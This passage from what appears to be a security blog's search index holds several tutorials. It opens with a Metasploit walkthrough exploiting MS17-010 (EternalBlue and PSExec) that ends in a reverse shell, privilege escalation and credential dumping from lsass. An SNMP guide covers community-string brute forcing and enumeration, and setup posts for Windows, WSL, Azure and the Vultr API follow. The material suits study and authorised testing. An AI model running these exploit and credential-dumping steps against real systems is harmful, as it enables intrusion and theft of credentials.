without compr...", "content": "This article demonstrates how to exploit the MS17-010 vulnerability with the Metasploit Framework. This article is for educational purposes only.Two methods are demonstrated; with and without compromised credentials. This article does not discuss the vulnerability and its background.Method 1 - MS17-010 exploitation without credentials: EternalBlueStep 1 - Launch Metasploit and choose the `ms17_010_eternalblue` exploitmsfconole[...]use exploit/windows/smb/ms17_010_eternalblueStep 2 - Configure options for your targetConfigure your exploit to run with options that are specific to your target. Note that setting the remote port is optional, this is 445 by defaultshow targetsset TARGET &lt;id&gt;set RHOST &lt;target IP&gt;set RPORT &lt;target port&gt; (445 by default)Step 3 - Configure options for your machineConfigure options for your machine with.set LHOST &lt;your IP&gt;set LPORT &lt;port of your choice&gt;Step 4 - Optional: Configure a payloadThis step is optional. By default, windows/x64/meterpreter/reverse_tcp is used.show PAYLOADSChoose and set a payload with:set PAYLOAD &lt;payload&gt;Step 5 - ExploitTo run the exploit use:exploitA reverse connection is initiated upon successful exploitation.For post-exploitation tips, see step 6 of the below instructions.MS17-010 Exploitation - With credentials: PSExecThis example requires credentials to run. This example is done using a domain-joined target.Step 1 - Launch Metasploit and choose the `ms17_010_psexec` exploitmsfconole[...]use exploit/windows/smb/ms17_010_psexecStep 2 - Configure options for your targetConfigure your exploit to run with options that are specific to your target. Note that setting the remote port is optional, this is 445 by defaultshow TARGETSset TARGET &lt;id&gt;set RHOST &lt;target IP&gt;set RPORT &lt;target port&gt; (445 by default)set SMBUSER &lt;user&gt;set SMBPASS &lt;password&gt;set SMBDOMAIN &lt;domain&gt;Step 3 - Configure options for your machineset LHOST &lt;your IP&gt;set LPORT &lt;port of your choice&gt;Step 4 - Optional: Configure a payloadThis step is optional. By default, windows/x64/meterpreter/reverse_tcp is used.show PAYLOADSChoose and set a payload with:set PAYLOAD &lt;payload&gt;For example, to use a smaller bind payload (stageless), you can choose:set PAYLOAD generic/shell_bind_tcpStep 5 - ExploitTo run the exploit use:exploitStep 6 - Optional: Post-ExploitationIf you used a non-meterpreter payload, you can upgrade it to Meterpreter using:CTRL + Z (background session)use post/multi/manage/shell_to_meterpretersessions -lset session &lt;session id&gt;set LHOST &lt;your IP&gt;set LPORT &lt;port of your choice&gt;exploitNote: You may need to run this a few times to upgrade the shell.Once you have upgraded your shell, you can escalate your privileges.session -i &lt;meterpreter session&gt;getsystemTo migrate process and dump credentials, use:psmigrate -N lsass.exehashdumpload kiwicreds_all" }, { "title": "Beginners Guide To Pentesting Azure", "url": "/posts/beginners-guide-pentesting-azure/", "categories": "article", "tags": "azure, connect, cryptography", "date": "2021-03-22 00:00:00 +0000", "snippet": "Beginners Guide To Pentesting AzureLet us start by installing the Azure Active Directory PowerShell Modules.Install-Module AzureADWith the module installed we can now run the following from the com...", "content": "Beginners Guide To Pentesting AzureLet us start by installing the Azure Active Directory PowerShell Modules.Install-Module AzureADWith the module installed we can now run the following from the command line to list all the available commands.get-command -Module AzureADIf we look down the list we can see a command for connecting to AzureConnect-AzureADA pop-up should appear asking you to authenticateIf you get the following error after trying to connect then you are possibly using PowerShell Core.Connect-AzureAD: One or more errors occurred. (Could not load type 'System.Security.Cryptography.SHA256Cng' from assembly 'System.Core, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'.): Could not load type 'System.Security.Cryptography.SHA256Cng' from assembly 'System.Core, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'.Connect-AzureAD: One or more errors occurred. (Could not load type 'System.Security.Cryptography.SHA256Cng' from assembly 'System.Core, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'.)Connect-AzureAD: Could not load type 'System.Security.Cryptography.SHA256Cng' from assembly 'System.Core, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'.Connect-AzureAD: One or more errors occurred. (Could not load type 'System.Security.Cryptography.SHA256Cng' from assembly 'System.Core, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'.): Could not load type 'System.Security.Cryptography.SHA256Cng' from assembly 'System.Core, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'.If you are able to successfully connect you will see a returned table showing your: Account Environment, Tenant ID Tenant Domain Account TypeWhat if you want to run cmdlets against a different Tennant.Connect-AzureAD -Tenant &lt;Tenant ID&gt;Where can I find the Tenant ID I hear you say?Getting the Tenant ID Via The Portal" }, { "title": "Auditing Juniper Network Devices", "url": "/posts/auditing-juniper-network-devices/", "categories": "article", "tags": "auditing, console-connection, juniper", "date": "2021-03-22 00:00:00 +0000", "snippet": "Lack of Console Connection TimeoutIt is possible for a console connection to become unused without being terminated, for example by an administrator forgetting to terminate the connection. When thi...", "content": "Lack of Console Connection TimeoutIt is possible for a console connection to become unused without being terminated, for example by an administrator forgetting to terminate the connection. When this happens, it is possible that an attacker could gain access to the authenticated session (either by gaining physical access or, in the case of less secure network protocols, remotely) and thus gain administrative access.In order to avoid this, the usual best practice is to set a timeout, so connections terminate within a specified time if no actions are taken.To check the current timeout sessions you can run the following commandget consoleOrshow cliTo set the timeoutset console timeout &lt;time in minutes&gt;Command introduced before Junos OS Release 7.4.set cli idle-timeout &lt;minutes&gt;Tacacs+Look for a missing TACACS+ encryption key. If one is not configured on the Juniper device then this configuration may affect the confidentiality of TACACS+ encrypted traffic, as an attacker may be able to intercept it without a password requirement.Authentication requests are sent by the Terminal Access Controller Access Control System Plus (TACACS+) server, using TCP/49, and an access response is returned. A TACACS+ encryption key can be configured on both the client and server in order to encrypt and help protect the traffic. Although TACACS+ is considerably more secure than TACACS, a number of security issues exist with the protocol, such as: TACACS+ is vulnerable to replay attacks. TACACS+ encrypted packets leak information about the authentication credentials. Weaknesses exist within the TACACS+ encryption.In order to address the last of these issues, a strong encryption key should be configured. However, if the key is leaked in plain text by another service an attacker could decrypt the authentication attempt, no matter how strong the encryption may be." }, { "title": "Remote SSH Access tutorial", "url": "/posts/remote-ssh-access-tutorial/", "categories": "tutorial", "tags": "ssh", "date": "2021-03-21 00:00:00 +0000", "snippet": "Remotely accessing Secure Shell (SSH) ServicesGenerating a New Public Keyssh-keygen -y -f ~/.ssh/id_rsa &gt; ~/.ssh/id_rsa.pub===========================================https://www.ssh.com/ssh/pass...", "content": "Remotely accessing Secure Shell (SSH) ServicesGenerating a New Public Keyssh-keygen -y -f ~/.ssh/id_rsa &gt; ~/.ssh/id_rsa.pub===========================================https://www.ssh.com/ssh/passphrase" }, { "title": "Simple Network Management Protocol (SNMP) :- Introduction", "url": "/posts/simple-network-management-protocol-snmp-introduction/", "categories": "tutorial", "tags": "snmp, snmpwalk, community-string", "date": "2021-01-19 00:00:00 +0000", "snippet": "SNMP stands for Simple Network Management Protocol. It is generally used by network monitoring applications to read and write network state variables(state of the interface, no. of sent packets etc...", "content": "SNMP stands for Simple Network Management Protocol. It is generally used by network monitoring applications to read and write network state variables(state of the interface, no. of sent packets etc.). Types of managed devices include servers, workstations and network devices.SNMP services run by default on the 161 UDP port.SNMP communications are generally protected by using an authentication string called community string. There are two types of community strings, a read-onlycommunity string that gives us access to the general variables of the network and a read-write one, that also allows us to set specific variables.If you can “guess” the read-only or read-write strings you can obtain quite a bit of access you would not normally have. In addition, if Windows baseddevices are configured with SNMP, often times with the RO/RW community strings, you can extract patch levels, services running, last reboot times,usernames on the system, routes, and various other amounts of information that is valuable to an attacker.If you can find a Cisco device running a private string for example, you can actually download the entire device configuration, modify it, and upload yourown malicious config. Often the passwords themselves are level 7 encoded which means they are trivial to decode and obtain the ‘enable‘ or login password forthe specific deviceWhen querying through SNMP, there is what’s called an MIB API. The MIB stands for the Management Information Base (MIB). This interface allows you to querythe device and extract information.RFC MIB = http://www.oidview.com/mibs/0/HOST-RESOURCES-MIB.htmlVENDOR SPECIFIC = http://www.oidview.com/mibs/detail.htmlMICROSOFT = http://www.oidview.com/mibs/311/md-311-1.html1.3.6.1.2.1.25.1.6.0 System Processes 1.3.6.1.2.1.25.4.2.1.2 Running Programs 1.3.6.1.2.1.25.4.2.1.4 Processes Path 1.3.6.1.2.1.25.2.3.1.4 Storage Units 1.3.6.1.2.1.25.6.3.1.2 Software Name 1.3.6.1.4.1.77.1.2.25 User Accounts 1.3.6.1.2.1.6.13.1.3 TCP Local Ports SNMPWalkSnmpwalk is a popular tool for testing SNMP. This tool acts as SNMP client, and we can use it for our penetration testing where we require making requeststo the SNMP service on the target host.Common UsageShows Helpsnmpwalk --helpLooks at one host, specifying a community string of publicsnmpwalk -v 1 -c public 10.11.1.22Here we are asking snmpwalk to walk one node subset in the MIBsnmpwalk -v 1 -c public 10.11.1.22 .1.3.6.1.2.1.25.1.6.0-M option allows us to include a file of MIB’s to look throghsnmpwalk -v 1 -c public 10.11.1.22 -M mibs.txtSome MIB nodes display in hex, in order to force display of those in ASCI we add the -Oa optionssnmpwalk -v 1 -c public 10.11.1.73 iso.3.6.1.2.1.2.2.1.2 -OaAdding the n to the -O option means it displays full OID’ssnmpwalk -v 1 -c public 10.11.1.73 iso.3.6.1.2.1.2.2.1.2 -OanSearching snmpwalk for a specific MID string.for ip in $(cat out | cut -d\" \" -f1 | sort -u | grep \"10.11\"); do echo $ip ;snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.4.2.1.2 ; doneFiltering output of a lookup for a specific stringsnmpwalk -v 1 -c public 10.11.1.73 -Oa | grep \"iso.3.6.1.2.1.2.2.1.2\"Important MIB’s ID for PentestestersWindowsRUNNING PROCESSES 1.3.6.1.2.1.25.4.2.1.2 INSTALLED SOFTWARE 1.3.6.1.2.1.25.6.3.1.2 SYSTEM INFO 1.3.6.1.2.1.1.1 HOSTNAME 1.3.6.1.2.1.1.5 DOMAIN 1.3.6.1.4.1.77.1.4.1 UPTIME 1.3.6.1.2.1.1.3 USERS 1.3.6.1.4.1.77.1.2.25 SHARES 1.3.6.1.4.1.77.1.2.27 DISKS 1.3.6.1.2.1.25.2.3.1.3 SERVICES 1.3.6.1.4.1.77.1.2.3.1.1 LISTENING TCP PORTS 1.3.6.1.2.1.6.13.1.3.0.0.0.0 LISTENING UDP PORTS 1.3.6.1.2.1.7.5.1.2.0.0.0.0 SYSTEM PROCESSES 1.3.6.1.2.1.25.1.6.0 STORAGE UNITS 1.3.6.1.2.1.25.2.3.1.4 LinuxRUNNING PROCESSES 1.3.6.1.2.1.25.4.2.1.2 SYSTEM INFO 1.3.6.1.2.1.1.1 HOSTNAME 1.3.6.1.2.1.1.5 UPTIME 1.3.6.1.2.1.1.3 MOUNTPOINTS 1.3.6.1.2.1.25.2.3.1.3 RUNNING SOFTWARE PATHS 1.3.6.1.2.1.25.4.2.1.4 LISTENING UDP PORTS 1.3.6.1.2.1.7.5.1.2.0.0.0.0 LISTENING TCP PORTS 1.3.6.1.2.1.6.13.1.3.0.0.0.0 SYSTEM PROCESSES 1.3.6.1.2.1.25.1.6.0 STORAGE UNITS 1.3.6.1.2.1.25.2.3.1.4 CiscoLAST TERMINAL USERS 1.3.6.1.4.1.9.9.43.1.1.6.1.8 INTERFACES 1.3.6.1.2.1.2.2.1.2 SYSTEM INFO 1.3.6.1.2.1.1.1 HOSTNAME 1.3.6.1.2.1.1.5 SNMPcommunities 1.3.6.1.6.3.12.1.3.1.4 UPTIME 1.3.6.1.2.1.1.3 IP ADDRESSES 1.3.6.1.2.1.4.20.1.1 INTERFACE DESCRIPTIONS 1.3.6.1.2.1.31.1.1.1.18 HARDWARE 1.3.6.1.2.1.47.1.1.1.1.2 TACACS SERVER 1.3.6.1.4.1.9.2.1.5 LOGMESSAGES 1.3.6.1.4.1.9.9.41.1.2.3.1.5 PROCESSES 1.3.6.1.4.1.9.9.109.1.2.1.1.2 SNMP TRAP SERVER 1.3.6.1.6.3.12.1.2.1.7`snmp-checksnmp-check allows you to enumerate the SNMP devices and places the output in a very human readable friendly format. It could be useful for penetration testing or systems monitoring.snmp-check -w ip_address-p, --port : SNMP port; default port is 161;-c, --community: SNMP community; default is public;-v, --version : SNMP version (1,2c); default is 1;-w, --write : detect write access (separate action by enumeration);-d, --disable_tcp : disable 'TCPsnmpsetIf we find write access to an SNMP server we can use snmpset to write to it.snmpset - communicates with a network entity using SNMP SET requestsOnesixtyoneOnesixtyone is an SNMP scanner that sends multiple SNMP requests to multiple IP addresses, trying different community strings and waiting for replies.Key Features Very fast scanning speed (over 50,000 guesses per second) Scan a single host or thousands of hosts at the same time You can tune scan speed to support both LAN and WAN testingPrepping Your DictionarySNMP strings in onesixtyone can’t be longer than 16 characters at time of this writing. If you have an error with your dictionary file you can find out which words are causing problems with the following command.cat snmpstrings.txt | grep -xv .\\{0,16\\}There is a current approve request in onesixtyone to increase the size as currently the following string which is default in the kali linux wordlists for snmp community strings can not be parsed for onesixtyone.This is the APC default community string:TENmanUFactOryPOWERHowever if you wish to use onesixtyone and you need to filter your list down you can do the following to pipe all the words between 0-16 characters into a new listcat snmpstrings.txt | grep -x '.\\{0,16\\}' &gt; snmp.txtExample usageScanning Hosts/Community Strings From Filesonesixtyone -c snmp.txt -i opensnmp.txt -i = This flag allows you to input hosts from a list-c = This flag allows you to input community strings from a list.Scanning a single host.onesixtyone -c /dict/snmp.txt 10.0.0.1Key Flags-c = file with community string names to try-i = file with target hosts-o = output log-d = debug mode-w = Wait in milliseconds between sending packets (default 10)-q = Quiet mode, do not print to std out.Brute Force And Scan Network SNMP bruteforce script.root@kali:/# echo \"public\" &gt; communityroot@kali:/# echo \"private\" &gt; communityroot@kali:/# echo \"manager\" &gt; communityroot@kali:/# for ip in $(seq 200 254); do echo 192.168.19.$ip ;done &gt; ips.txtroot@kali:/# onesixtyone -c community -i ips.txtSNMP with NMAPThis is a standard network scan looking for potential snmp open port hosts.nmap -Pn -sU -sV -p 161 --open 10.0.0.1/24-Pn = Treat all hosts as online -sU = Specifys a UDP Scan-p = Specify the port-sV = Specify to perform service enumeration--open = Returns on Open PortsThis should hopefully tell us the version number of the SNMP. Now we can run nmap with scripts to further enumeratenmap -Pn -sU -p 161 10.0.0.1 --script=snmp-bruteNMAP NSE Scripts for SNMPcd \"/usr/share/nmap/scripts\"ls -la | grep \"snmp\"Flagssnmp-brute = Attempts to find an SNMP community string by brute force guessingsnmp-hh3c-logins = Attempts to enumerate Huawei / HP/H3C Locally Defined Userssnmp-info = Extracts basic information from an SNMPv3 GET requestsnmp-interfaces = Attempts to enumerate network interfaces through SNMPsnmp-ios-config = Attempts to download Cisco router IOS configuration filessnmp-netstat = Attempts to query SNMP for a netstat like outputsnmp-processes = Attempts to enumerate running processes through SNMPsnmp-sysdescr = Attempts to extract system information from an SNMP version 1 servicesnmp-win32-services = Attempts to enumerate Windows services through SNMPsnmp-win32-shares = Attempts to enumerate Windows Shares through SNMP.snmp-win32-software = Attempts to enumerate installed software through SNMP.snmp-win32-users = Attempts to enumerate Windows user accounts through SNMP" }, { "title": "Customising Windows 10", "url": "/posts/customising-windows-10/", "categories": "article", "tags": "customising-windows, vms, vmware, windows", "date": "2020-09-21 00:00:00 +0100", "snippet": "This guide is going to take you through a number of components to get your machine ready for subsequent parts of this guide.PreparingHit the Windows key and type cmd. Opening Windows CMD Prompt fr...", "content": "This guide is going to take you through a number of components to get your machine ready for subsequent parts of this guide.PreparingHit the Windows key and type cmd. Opening Windows CMD Prompt from Start Menu.Hold down CTRL + SHIFT and now hit the Enter key to open the command prompt as an elevated user.Now hit the Windows key and type PowerShell Elevated PowerShell Prompt.Hold down CTRL + SHIFT and now hit the Enter key to open the PowerShell prompt as an elevated user.Windows Version Windows Version Information Displayed Via winver Command.PowerShell 7Quick one-liner to install the latest version (PowerShell 7 is current at time of print) on Windowsiex \"&amp; { $(irm https://aka.ms/install-powershell.ps1) } -UseMSI\"Follow the Wizard to the step headed “Optional Actions” and check the selection to “Enable PowerShell remoting”. I also like to select “Add ‘Open here’ context menus to Explorer”. PowerShell 7 Installing Optional Actions.Select the “Launch PowerShell” in the bottom left of the next wizard.Now “Right Click” the PowerShell icon and select “Pin to taskbar”. Right click pin to taskbar.Now enter $PSVersionTable to confirm the version of PowerShell.PowerShell 7 Get Version Information with $PSVersionTable.To install on Linuxwget https://aka.ms/install-powershell.sh; sudo bash install-powershell.sh; rm install-powershell.shWSLWSL version 2 is real Linux on real Windows :)Next, we will install the Windows Subsystem for Linux and the VirtualMachinePlatform.Dism vs Enable-WindowsOptionalFeaturedism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestartdism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestartEnable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux -NoRestartEnable-WindowsOptionalFeature -Online -FeatureName VirtualMachinePlatform -NoRestartInstalling Optional Features.Setting version 2 of the Windows Subsystem for Linux to the defaultwsl –set-default-version 2If you get an error message saying WSL 2 requires an update to its kernel component. For information please visit https://aka.ms/wsl2kernelThis means you need to install the MSI another component.Go to https://aka.ms/wsl2kernelDownload the Linux Kernel Update package for WSLv2.Download by clicking the link “WSL2 Linux kernel update package for x64 machines”Click the msi installer.If at this point you need to restart your virtual machine.restart-computer -ConfirmList various versions of Linuxwsl --listwsl -l -vListing versions we can see the differenceUsing the wsl --list versions command.We will want to upgrade any WSL Linux machines running version 1 (Hyper-V method)Reasons to upgrade to WSLv2 Reasons to Upgrade to WSLv2wsl --set-version kali-linux 2Coverting Kali-Linux WSLv1 to WSLv2.Run the Kali Linux Distributionwsl -d kali-linuxDebuggingwsl --shutdowndism /Online /Cleanup-Image /RestoreHealthInstall Code by typing code .Installing Visual Studio Code.Now type code . again and watch as Visual Studio opens up in the Windows Host showing files from the WSLRunning and Installing Visual Studio inside WSL.Docker for WindowsRequirements Windows 10 64-bit: Pro, Enterprise, or Education (Build 16299 or later). Hyper-V and Containers Windows features must be enabled. Note - For Windows Home Edition follow this link https://docs.docker.com/docker-for-windows/install-windows-home/ Grab the installer https://hub.docker.com/editions/community/docker-ce-desktop-windows/ Double-click the blue “Get Docker Desktop for Windows (stable)” button to download the executable. Docker Installer. Double-Click the “Docker Desktop Installer.exe” to run the installer. When prompted, ensure the Enable Hyper-V Windows Features option is selected on the Configuration page. Follow the instructions on the installation wizard to authorize the installer and proceed with the install. If your admin account is different to your user account, you must add the user to the docker-users group. Run Computer Management as an administrator and navigate to Local Users and Groups &gt; Groups &gt; docker-users. Right-click to add the user to the group. Log out and log back in for the changes to take effect.Terminal AppThe terminal app is seemingly turning out to be a boon for developers and those who have always looked at Windows machines with huge expectations. The open-source terminal app boasts a range of powerful features including multiple tabs, Unicode and UTF-8 character support, and GPU accelerated text rendering engine. It’s designed to be an all-in-one platform for Command Prompt, PowerShell, WSL and SSH so that developers can have seamless access to all the tools. Even better, this all-new command-line app also features custom themes and styles for a more personalized experienceTerminal App ReleasesThe new ShellThe New Shell.Pin terminal to the taskbarPin terminal to the taskbar.CustomisationCascadia FontsNext, I am going to install Microsofts Cascadia Code FontPin terminal to the taskbar.Click “Install for all users”Install Font for all users.GitInstall Git for WindowsPosh-Git adds Git status information to your prompt as well as tab-completion for Git commands, parameters, remotes, and branch names. Oh-My-Posh provides theme capabilities for your PowerShell prompt. PSReadline lets you customize the command line editing environment in PowerShell.Install-Module posh-git -Scope CurrentUserInstall-Module oh-my-posh -Scope CurrentUserPowerShell CoreInstall-Module -Name PSReadLine -Scope CurrentUser -Force -SkipPublisherCheckOh My Posh ThemesPick a theme for Oh My PoshImport-Module posh-gitImport-Module oh-my-poshSet-Theme ParadoxCustomise your KaliInstall Powerlinesudo apt install golang-gogo get -u github.com/justjanne/powerline-goInstall Hyper for Windowshttps://releases.hyper.is/download/winInstall Hyper For Windows.With the Hypershell open, enter the following commandsOpen HyperShell.settings.jsonThe settings.json file as the name suggests contains settings for the terminal application. A few of the important settings like what should be your default profile, color scheme, key bindings, etc can be found here.To open the default.json file hold the alt key while opening the settings.json file as mentioned above.defaults.jsonThe defaults.json file contains all the default configuration values for the terminal. This file can be used for reference, as it is an auto-generated file and contains all complete default configuration of the terminal application.Install ChocolateyFrom an elevated PowerShell PromptSet-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))Confirm the installation of ChocolateyConfirm the installation of Chocolatey.Let us install some packageschoco install wsl-kalilinuxFireEye Commando-vmDownload the latest from:https://github.com/fireeye/commando-vmUnzip the folder.Use my custom profile evilsaint.json.Custom ProfileWindows 10My main additions are{\"name\": \"wsl.fireeye\"},{\"name\": \"hyperv.fireeye\"},{\"name\": \"markdownmonster\"},{\"name\": \"wsl-ubuntu-2004\"},{\"name\": \"wsl-archlinux\"},{\"name\": \"wsl-debiangnulinux\"},{\"name\": \"microsoft-windows-terminal\"},{\"name\": \"everything\"},I like to remove{\"name\": \"burp.free.fireeye\"},cinst install &lt;package&gt;cup allCustomising WSLKali Machinesudo apt-get updatesudo apt-get dist-upgradesudo apt-get cleansudo apt-get --yes --force-yes install kali-desktop-xfce xorg xrdpsed -i 's/port=3389/port=3390/g' /etc/xrdp/xrdp.inisudo apt install kali-win-kexsudo apt install kali-linux-largeRun Win-KeX Windows mode seamless modeMoving Aroundstart WT 'new-tab \"PowerShell\" ; split-pane -p \"KaliGeneral\" ; split-pane -H -p \"KaliC2\" | set-focus -n wsl.exemkdir C:\\Users\\consultant\\AppData\\Local\\KaliC2wsl --import KaliC2 C:\\Users\\consultant\\AppData\\Local\\KaliC2 .\\kali-base.tar --version 1mkdir C:\\Users\\consultant\\AppData\\Local\\KaliGeneralwsl --import KaliGeneral C:\\Users\\consultant\\AppData\\Local\\KaliGeneral .\\kali-base.tar --version 2Windows Terminal Help.Windows Terminal Help - Split Pane.Windows Terminal Help - New Tab.Windows Terminal Help - Focus Tab.Two Versions Of Kali.Customise Toys Groupy Taskbar X T Clock Power Toys Everything Rocket / Launcher wox sharex ditto" }, { "title": "Automating Vultr Setup with Vultr API V2", "url": "/posts/automating-vultr-setup-vultr-api-v2/", "categories": "tutorial", "tags": "vultr, api", "date": "2020-04-20 00:00:00 +0100", "snippet": "The Vultr API v2 is a set of HTTP endpoints that adhere to RESTful design principles and CRUD actions with predictable URIs. It uses standard HTTP response codes, authentication, and verbs. The API...", "content": "The Vultr API v2 is a set of HTTP endpoints that adhere to RESTful design principles and CRUD actions with predictable URIs. It uses standard HTTP response codes, authentication, and verbs. The API has consistent and well-formed JSON requests and responses with cursor-based pagination to simplify list handling. Error messages are descriptive and easy to understand. All functions of the Vultr customer portal are accessible via the API, enabling you to script complex unattended scenarios with any tool fluent in HTTP.API KeyThe Vultr API v2 uses API keys for authentication. You can manage your API keys in the Vultr customer portal. Please do not share API keys publicly, or embed them in client-side code. It is a good security practice to restrict their use by IP address in the customer portal.To authenticate a request, send your API Key as a bearer token in the request header.Authentication Examplecurl -H 'Authorization: Bearer {api-key}' https://api.vultr.com/v2/accountList RegionsList all Regions at Vultr.Example Request:curl --location --request GET 'https://api.vultr.com/v2/regions'Example Response:{ \"regions\":[ { \"id\":\"ams\", \"city\":\"Amsterdam\", \"country\":\"NL\", \"continent\":\"Europe\", \"options\":[ \"ddos_protection\" ] }, { \"id\":\"atl\", \"city\":\"Atlanta\", \"country\":\"US\", \"continent\":\"North America\", \"options\":\\[ \\] },}List of All Regions List all Regions.PlansA Plan is a particular configuration of vCPU, RAM, SSD, and bandwidth to deploy an Instance. Not all Plans are available in all Regions. You can browse plans in the Customer Portal or get a list of Plans from the API.List PlansGet a list of all VPS plans at Vultr. The list can be filtered by type.Example Request:curl --location --request GET 'https://api.vultr.com/v2/plans'Example Response:{ \"plans\":[ { \"id\":\"vc2-1c-1gb\", \"vcpu_count\":1, \"ram\":1024, \"disk\":25, \"bandwidth\":1024, \"monthly_cost\":5, \"type\":\"vc2\", \"locations\":[\"ewr\",\"ord\",\"dfw\",\"sea\",\"lax\",\"atl\",\"ams\",\"lhr\",\"fra\",\"sjc\",\"syd\",\"yto\",\"cdg\",\"nrt\",\"mia\",\"sgp\"] }, { \"id\":\"vc2-1c-2gb\", \"vcpu_count\":1, \"ram\":2048, \"disk\":55, \"bandwidth\":2048, \"monthly_cost\":10, \"type\":\"vc2\", \"locations\":[\"ewr\",\"ord\",\"dfw\",\"sea\",\"lax\",\"atl\",\"ams\",\"lhr\",\"fra\",\"sjc\",\"syd\",\"yto\",\"cdg\",\"nrt\",\"mia\",\"sgp\"] },}List of all plans List of all Plans.Operating SystemList OSWe have a wide range of operating systems available to deploy server instances. You can also upload an ISO or choose from our public ISO library.List the OS images available for installation at Vultr.Example Request:curl --location --request GET 'https://api.vultr.com/v2/os'Example Response:{ \"os\":[ { \"id\":124, \"name\":\"Windows 2012 R2 x64\", \"arch\":\"x64\", \"family\":\"windows\" }, { \"id\":159, \"name\":\"Custom\", \"arch\":\"x64\", \"family\":\"iso\" }, ], \"meta\":{ \"total\":25, \"links\":{ \"next\":\"\", \"prev\":\"\" } }}List of All Operation System List of All Operating Systems.ApplicationOne-Click Applications are ready-to-run with minimal configuration. We have an extensive documentation library for our One-Click Apps.Get a list of all One-Click Applications.Example Request:curl --location --request GET 'https://api.vultr.com/v2/applications'Example Response:{ \"applications\": [ { \"id\": 1, \"name\": \"LEMP\", \"short_name\": \"lemp\", \"deploy_name\": \"LEMP on CentOS 6 x64\" } ], \"meta\": { \"total\": 1, \"links\": { \"next\": \"\", \"prev\": \"\" } }}Full List of AppsList of all Applications.Once you determine all id’s parameter needed, you can now start create new server.Create InstanceCreate a new VPS Instance in a region with the desired plan. Choose one of the following to deploy the instance:os_idiso_idsnapshot_idapp_idSupply other attributes as desired.Example Request:curl --location --request POST 'https://api.vultr.com/v2/instances' \\--header 'Authorization: Bearer {api-key}' \\--header 'Content-Type: application/json' \\--data-raw '{\t\"region\" : \"ewr\", \t\"plan\" : \"vc2-6c-16gb\", \t\"label\" : \"my label\",\t\"os_id\" : 362,\t\"user_data\" : \"dGVzdA==\",\t\"backups\": \"enabled\"}'REQUEST BODY SCHEMA: application/jsonInclude a JSON object in the request body with a content type of application/json.ParameterTypeDescriptionregion (required)stringThe Region id where the Instance is located.plan (required)stringThe Plan id to use when deploying this instance.os_idintegerThe Operating System id to use when deploying this instance.ipxe_chain_urlstringThe URL location of the iPXE chainloader.iso_idstringThe ISO id to use when deploying this instance.script_idintegerThe Startup Script id to use when deploying this instance.snapshot_idstringThe Snapshot id to use when deploying the instance.enable_ipv6booleanEnable IPv6.truefalseattach_private_networkArray of StringsAn array of Private Network ids to attach to this Instance. This parameter takes precedence over enable_private_network. Please choose one parameter.labelstringA user-supplied label for this instance.sshkey_idstringThe SSH Key id to install on this instance.backupsstringEnable automatic backups for the instance.enableddisabledapp_idintegerThe Application id to use when deploying this instance.user_datastringThe user-supplied, base64 encoded user data to attach to this instance.ddos_protectionbooleanEnable DDoS protection (there is an additional charge for this).truefalseactivation_emailbooleanNotify by email after deployment.truefalsehostnamestringThe hostname to use when deploying this instance.tagstringThe user-supplied tag.firewall_group_idstringThe Firewall Group id to attach to this Instance.reserved_ipv4stringID of the floating IP to use as the main IP of this server.enable_private_networkbooleanIf true, private networking support will be added to the new server.This parameter attaches a single network. When no network exists in the region, it will be automatically created.If there are multiple private networks in the instance's region, use attach_private_network instead to specify a network." }, { "title": "Automating Vultr Setup with Vultr API V1", "url": "/posts/automating-vultr-setup-vultr-api-v1/", "categories": "tutorial", "tags": "vultr, automation", "date": "2020-04-20 00:00:00 +0100", "snippet": "API Endpoint: https://api.vultr.com/API Key: Available in Members AreaExamplecurl -H \"API-Key: YOURKEY\" https://api.vultr.com/v1/server/create --data \"DCID=8\" --data \"VPSPLANID=201\" --data \"OSID=27...", "content": "API Endpoint: https://api.vultr.com/API Key: Available in Members AreaExamplecurl -H \"API-Key: YOURKEY\" https://api.vultr.com/v1/server/create --data \"DCID=8\" --data \"VPSPLANID=201\" --data \"OSID=270\" --data \"APPID=17\" --data \"label=docker-test\"The code example is calling Vultr API to create new Server--data \"DCID=8\" = \"DCID\":\"8\",\"name\":\"London\" (server region)--data \"VPSPLANID=201\" = \"VPSPLANID\":\"201\",\"name\":\"1024 MB RAM,25 GB SSD,1.00 TB BW\" (plan)--data \"OSID=270\" = \"OSID\":270,\"name\":\"Ubuntu 18.04 x64\" (Operating System)--data \"APPID=17\" = \"APPID\":\"17\", \"name\":\"Docker\" (application)--data \"label=docker-test\" = \"label=docker-test\" (server label)cURLGET request with no arguments.curl \"https://api.vultr.com/v1/os/list\"GET request that requires your API key.curl -H 'API-Key: YOURKEY' \"https://api.vultr.com/v1/server/list\"GET request with additional parameters.curl -H 'API-Key: YOURKEY' -G --data \"SUBID=12345\" \"https://api.vultr.com/v1/server/list\"POST request that requires your API key.curl -H 'API-Key: YOURKEY' --data \"SUBID=12345\" \"https://api.vultr.com/v1/server/start\"POST request with additional parameters.curl -H 'API-Key: YOURKEY' --data \"SUBID=12345\" --data-urlencode 'label=my server!' \"https://api.vultr.com/v1/server/label_set\"Server region/v1/regions/listRetrieve a list of all active regions. Note that just because a region is listed here, does not mean that there is room for new servers.API Key Required: NoRequest Type: GETExample Request:curl https://api.vultr.com/v1/regions/listExample Response:{ \"1\": { \"DCID\": \"1\", \"name\": \"New Jersey\", \"country\": \"US\", \"continent\": \"North America\", \"state\": \"NJ\", \"ddos_protection\": true, \"block_storage\": true, \"regioncode\": \"EWR\" }, \"2\": { \"DCID\": \"2\", \"name\": \"Chicago\", \"country\": \"US\", \"continent\": \"North America\", \"state\": \"IL\", \"ddos_protection\": false, \"block_storage\": false, \"regioncode\": \"ORD\" }}Example Parameter--data \"DCID=8\" = \"DCID\":\"8\",\"name\":\"London\" (server region)List of All Regions List of all regions.Plans/v1/plans/listRetrieve a list of all active plans. 